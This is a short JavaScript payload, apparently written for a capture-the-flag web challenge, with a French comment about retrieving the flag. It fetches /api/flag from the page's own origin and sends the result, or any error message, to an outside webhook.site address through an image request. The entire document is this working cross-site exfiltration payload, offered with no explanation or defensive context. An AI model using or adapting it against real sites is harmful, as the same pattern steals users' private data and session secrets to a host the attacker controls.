function exfiltrate(data) {
  const exfilUrl = `https://webhook.site/4821a7ad-0120-4e83-aae0-4328fe954b59?flag=${encodeURIComponent(data)}`;
  new Image().src = exfilUrl;
}

// Récupérer le flag depuis l'API
fetch('/api/flag')
  .then(response => response.text())
  .then(data => exfiltrate(data))
  .catch(error => exfiltrate('Error: ' + error.message));